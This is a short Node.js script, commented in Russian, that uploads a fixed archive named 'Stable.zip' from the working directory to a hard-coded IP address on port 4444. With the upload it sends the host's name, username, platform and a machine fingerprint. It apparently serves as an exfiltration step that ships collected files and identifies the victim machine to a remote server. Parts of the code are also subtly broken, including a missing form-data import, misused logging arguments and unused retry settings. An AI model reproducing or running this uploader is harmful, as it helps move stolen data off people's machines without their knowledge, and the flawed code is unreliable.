const fs = require('fs');
const axios = require('axios');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

// ===================== CONFIGURATION =====================
const CONFIG = {
    serverUrl: 'http://92.246.137.44:4444', // Полный URL сервера
    archiveFileName: 'Stable.zip', 
    chunkSize: 256 * 1024,         // 256KB chunk size
    retryDelay: 5000,              // 5 seconds between retry attempts
    maxRetries: 5                  // Maximum reconnection attempts
};

// ===================== UTILITY FUNCTIONS =====================
function log(message, isError = false) {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}`;
    
    if (isError) {
        console.error(logMessage);
    } else {
        console.log(logMessage);
    }
    
    try {
        fs.appendFileSync('upload.log', `${logMessage}\n`);
    } catch (error) {
        console.error(`Error writing to log: ${error.message}`);
    }
}

function generateClientId() {
    try {
        const macAddress = getMacAddress();
        const hostname = os.hostname();
        const username = os.userInfo().username;
        
        const hash = crypto.createHash('md5')
            .update(`${macAddress}:${hostname}:${username}`)
            .digest('hex')
            .substring(0, 8);
        
        return hash;
    } catch (error) {
        return Math.random().toString(36).substring(2, 10);
    }
}

function getMacAddress() {
    try {
        const networkInterfaces = os.networkInterfaces();
        for (const name of Object.keys(networkInterfaces)) {
            for (const netInterface of networkInterfaces[name]) {
                if (!netInterface.internal && netInterface.mac !== '00:00:00:00:00:00') {
                    return netInterface.mac;
                }
            }
        }
        return 'unknown';
    } catch (error) {
        return 'unknown';
    }
}

// ===================== FILE UPLOAD FUNCTION =====================
async function uploadFile() {
    try {
        const filePath = path.join(process.cwd(), CONFIG.archiveFileName);
        
        // Проверяем существование файла
        if (!fs.existsSync(filePath)) {
            log(`Файл не найден: ${filePath}`, true);
            return false;
        }

        // Создаем FormData
        const formData = new FormData();
        formData.append('file', fs.createReadStream(filePath), {
            filename: path.basename(filePath),
            contentType: 'application/zip'
        });

        // Системная информация
        const systemInfo = {
            hostname: os.hostname(),
            platform: os.platform(),
            type: os.type(),
            arch: os.arch(),
            username: os.userInfo().username,
            id: generateClientId()
        };

        log(`Начало загрузки файла: ${CONFIG.archiveFileName}`);
        log(`Информация о системе: ${JSON.stringify(systemInfo)}`);

        // Отправляем файл
        const response = await axios.post(CONFIG.serverUrl, formData, {
            headers: {
                ...formData.getHeaders(),
                'X-Client-Info': JSON.stringify(systemInfo)
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });

        log('Ответ сервера:', JSON.stringify(response.data));
        return true;
    } catch (error) {
        log('Ошибка при загрузке:', error.message, true);
        return false;
    }
}

// ===================== MAIN FUNCTION =====================
async function main() {
    try {
        log('Начало процесса загрузки архива');
        const success = await uploadFile();
        
        if (success) {
            log('Архив успешно загружен');
            process.exit(0);
        } else {
            log('Не удалось загрузить архив', true);
            process.exit(1);
        }
    } catch (error) {
        log(`Фатальная ошибка: ${error.message}`, true);
        process.exit(1);
    }
}

// Запускаем основную функцию
main();
